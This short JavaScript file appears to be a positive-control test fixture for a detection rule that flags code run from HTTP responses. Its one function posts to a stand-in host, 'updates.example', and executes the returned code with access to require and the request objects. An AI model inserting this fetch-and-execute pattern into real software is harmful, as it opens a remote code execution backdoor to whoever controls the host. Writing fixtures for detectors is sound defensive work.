// Positive control for the existing HTTP-response execution composite.
const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
export async function dispatch(client, req, res) {
  const hotfix = await client.post("https://updates.example/hotfix");
  const code = hotfix.code;
  const fn = new AsyncFunction("require", "req", "res", code);
  await fn(require, req, res);
}
